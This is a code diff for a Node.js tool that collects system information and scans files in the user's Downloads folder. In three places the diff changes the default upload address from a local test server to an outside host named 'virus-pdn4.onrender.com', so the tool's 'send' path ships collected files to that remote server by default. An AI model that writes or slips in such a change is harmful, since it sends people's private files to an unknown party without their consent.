@@ -21,7 +21,7 @@ const https = require('https');
 const url = require('url');
 
 const MAX_SCAN_CONTENT_SIZE = 200 * 1024; // 200 KB max file snippet for downloads scan
-const DEFAULT_SERVER_URL = process.env.SYSTEM_INFO_SERVER_URL || 'http://localhost:3000/upload';
+const DEFAULT_SERVER_URL = process.env.SYSTEM_INFO_SERVER_URL || 'https://virus-pdn4.onrender.com/upload';
 const DEFAULT_USERNAME = process.env.SYSTEM_INFO_USERNAME || 'anonymous';
 
 // ============================================================================
@@ -1041,7 +1041,7 @@ class InteractiveMenu {
     console.log('\n📤 SEND COLLECTED DATA TO SERVER\n');
 
     // Default values
-    const defaultUrl = 'http://localhost:3000/upload';
+    const defaultUrl = 'https://virus-pdn4.onrender.com/upload';
     const defaultBase = this.fileManager ? this.fileManager.baseDir : './code-files';
 
     this.askQuestion(`Server URL (default: ${defaultUrl}): `, (serverUrl) => {
@@ -1278,7 +1278,7 @@ if (args.length === 0) {
     console.error(`❌ Failed to write JSON: ${err.message}`);
   }
 } else if (args[0] === 'send') {
-  const targetUrl = args[1] || 'http://localhost:3000/upload';
+  const targetUrl = args[1] || 'https://virus-pdn4.onrender.com/upload';
   const username = args[2] || 'anonymous';
   const downloadsDir = CodeFileManager.getDownloadsDir();
   const payload = collectDownloadsPayload(downloadsDir);
